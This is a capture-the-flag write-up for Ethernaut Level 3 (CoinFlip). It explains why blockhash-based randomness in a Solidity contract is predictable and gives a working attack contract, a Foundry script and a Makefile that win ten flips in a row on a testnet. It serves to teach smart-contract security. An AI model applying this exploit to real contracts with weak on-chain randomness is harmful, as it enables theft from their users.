# Ethernaut Level 3

---

Contract:

```solidity
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

Since blockchains are deterministic systems, getting real random numbers is a challenge if we want to add randomness to our contracts. A common practice is to use `Chainlink VRF` to fulfill random number requests from our contracts while Chainlink nodes provide decentuality and safety.

In this contract, the way it attempts randomness is problematic: we can simply do the exact same thing in our attack contract and we will get the same result of  `side` as original contract. We want to first run the process before calling `flip` and feed the result directly to `_guess` so that we will acheive 100% success rate.

We use Foundry for solution. For `CoinFlipAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlip = ICoinFlip(_coinFlipAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue / FACTOR) == 1 ? true : false;
        coinFlip.flip(side);
    }
}
```

We use an Interface since we mainly just want to deal with `flip` method from the original contract. Then in the attack contract, we reimplemented the "randomness" logic as original contract and wired the result directly to `flip` method.

In `CoinFlip.s.sol`:

```solidity
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";

contract CoinFlipScript is Script {
    address TARGET_ADDRESS = 0xXXXXX;
    CoinFlip coinFlip = CoinFlip(TARGET_ADDRESS);
    
    function run() external {
        vm.startBroadcast();
        CoinFlipAttack coinFlipAttack = new CoinFlipAttack(TARGET_ADDRESS);
        coinFlipAttack.attack();
        vm.stopBroadcast();
        console.log("After attack: consecutiveWins =", coinFlip.consecutiveWins());
    }
}
```

We have to pay extra attention that we cannot use a for loop to do it ten times since there's a mechanism in the original contract to prevent transactions from the same block:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

So we have to run the script ten times. We use a Makefile to automate this process:

```makefile
# Makefile

ifneq (,$(wildcard .env))
    include .env
    export
endif

TIMES ?= 10
SCRIPT := script/CoinFlip.s.sol:CoinFlipScript
RPC_URL ?= $(SEPOLIA_RPC_URL)
ACCOUNT ?= default

run-one:
	forge script $(SCRIPT) --broadcast --rpc-url $(RPC_URL) --account $(ACCOUNT) -vv

run-loop:
	@i=1; \
	while [ $$i -le $(TIMES) ]; do \
	  echo "=== Running attempt $$i of $(TIMES) ==="; \
	  make run-one; \
	  i=$$(( $$i + 1 )); \
	done

.PHONY: run-one run-loop
```

We can always check the `consecutiveWins()` using Foundry `cast`:

```bash
cast call 0xXXXXXXXXX "consecutiveWins()(uint256)" --rpc-url $SEPOLIA_RPC_URL
```

If you run `make run-one` each for a time, you can use this command to see an increment to the `consecutiveWins()`.